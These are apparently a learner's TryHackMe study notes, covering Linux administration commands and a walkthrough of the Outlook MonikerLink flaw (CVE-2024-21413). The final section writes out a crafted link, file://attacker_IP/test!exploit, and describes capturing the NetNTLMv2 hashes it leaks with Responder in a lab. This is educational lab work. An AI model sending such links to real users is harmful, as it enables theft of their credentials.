# TryHackMe Learning Notes
Comprehensive notes from TryHackMe Pre Security (Aug 2026)

## Introduction
This document contains notes from structured learning on TryHackMe, covering Linux fundamentals, security concepts, vulnerability exploitation (CVE-2024-21413), and Metasploit framework basics. These notes track progression from system administration to penetration testing techniques.

## NEW SKILLS UNLOCKED

### System Administration
```bash
su <option> <username>
``` 
It allows us to switch user

***Importance of /etc directory***
One of the important directories to store system files used by OS. Files like shadow, sudoers, passwd exist here. Shadow and passwd stores password in encrypted format in sha512.

***Importance of /var directory***
It is also one of the main root folders found in Linux. This stores data that is frequently accessed or written by services or app.

***/root directory*** is the home directory for root user.


### File Transfer & Utilities
- wget allows us to download files from the web via HTTP/HTTPS.
```
wget https://assests.tryhackme.com/additional/linux-fundamentals/part3/myfile.txt
```

- Transfering files from our host -> SCP(SSH)

Secure copy or SCP is a way that allows us to transfer files between 2 computers using SSH protocol.
```bash
scp important.txt ubuntu@<IP>:/home/ubuntu/transferred.txt
```
This command copies a local file named important.txt to a remote machine, logging in as user ubuntu and saving it to /home/ubuntu/transferred.txt
```bash
scp ubuntu@<IP>:/home/ubuntu/documents.txt notes.txt
```
This command securely copies a remote file from a server (IP) to our local machine. It downloads /home/ubuntu/document.text from the remote user ubuntu and saves it locally as notes.txt

- Serving files from web
We can make some files in a directory and use python server to access it from other machine.
```python
python3 -m http.server
```
This starts the server
Now from another machine
```python
wget http://<your IP:PORT>/<filename>
```
The 0.0.0.0/8000 means the server will listen on all network interfaces on our machine like lo, eth0, tun0 etc. But other's can't access 0.0.0.0/8000 directly.
They use our actual IP. Someone can access it via lo, eth0 or tun0 etc.

eg:-
Suppose if our machine has:

eth0 (physical ethernet) = `<NETWORK_IP>`

tun0 (VPN tunnel) = `<VPN_IP>`

lo (localhost) = `IP 127.0.0.1`

By listening on `0.0.0.0:8000`:
Someone can connect via ANY of these IPs:

```
wget http://<NETWORK_IP>:8000/file
```
```
wget http://<VPN_IP>:8000/file
```
```
wget http://127.0.0.1:8000/file
```
To access only through one interface, we can use -
```python
python3 -m http.server --bind <VPN_IP>
```
The IP shown in server log is the machine that downloaded the file.

### Process Management
```bash
ps aux
```
It provides process service for all users in detailed format like cpu, ram and captures background daemons and services.
```bash
top
```
Same like before but refreshes every 10 sec.

### Services (systemctl)
Systemctl is command that controls services.
```bash
systemctl start [service] 
```
Starts the service right now
```bash
systemctl stop [service]
```
Stop a service right now
```bash
systemctl enable [service]
```
Make it start automatically on boot
```bash
systemctl disable [service]
```
Stop it from starting on boot
```bash
systemctl status [service]
```
Check if it's running

```bash 
fg
```
Command, we use to bring a previously backgrounded process back to the foreground.

`SIGTERM (signal 15)` is the clean way to kill a process.

### Scheduling (cron)

To schedule task
```bash
$ crontab -e
$ crontab -l 
```
-e -> to open a editor

-l -> To list all crontabs

### Packages
When developers wish to submit software to the community, they will submit it to an `apt` repo.

- Learn bash at -> [BASH](https://tryhackme.com/room/bashscripting)
- Learn Regex at -> [REGEX](https://tryhackme.com/room/catregex)
- Vim cheatsheet at -> [VIM](https://vim.rtorr.com/)

### CVE-2024-21413 (MonikerLink)
Microsoft announced a Microsoft outlook RCE & credential leak vulnerability with assigned CVE-2024-21413.

`NTLM` -> Windows New Technology LAN Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity.

CVE-2024-21413 is a critical 9.8-severity remote code execution vulnerability in Microsoft Outlook, known as the "MonikerLink" bug. The vulnerability bypasses Outlook's security mechanisms when handing a specific type of hyperlink known as a Moniker Link. An attacker can abuse this by sending an email that contains a malicious Moniker Link to a victim, resulting in Outlook sending the user's NTLM credentials to the attacker once the hyperlink is clicked.


***Methodology***

When we get email from someone outside our organization, outlook puts it in protected view, which acts like a shield. If an email tries to make our computer reach out to a remote server or open a dangerous file link (file://attacker_ip/test), outlook spots it, and pops up a security warning.

Windows uses a background system called COM to open special links called 'Moniker links.'
But if an attacker adds an exclamation mark and any text to the end of file link -> file://attacker_IP/test!exploit -> it bypasses the outlook's parser, which bypasses the protected view.

**Now what an attacker can do with that**

Normally, when we click web links (https://), our browser just asks a website for a page. But when we click a network file link (file://), windows assumes it's trying to connect to a shared folder in our office network.

Then windows automatically makes a handshake by authenticating to the server.

eg: "Hey server, let me prove who i am so you let me into this folder."

Windows automatically packages up our username and a scrambled, encrypted version of our password (called NetNTLMv2 hash) and sends it over to that server.

Because the links points to the attacker's computer, where attacker isn't hosting a real folder, but running a tool like Responder, designed to listen for that secret code.

OR 

They can do remote code execution, like running a malware in background without we ever clicking `install.`

**So it's time to exploit this**

I created a directory named CVE-2024-21413 which contains the POC of this vulnerability, which i will use to exploit it.
I have the exploit in this directory replacing the attacker_ip with our tun0 interface ip. Then we listen using responder in tun0 interface which captures the NET-NTLMv2 hash.

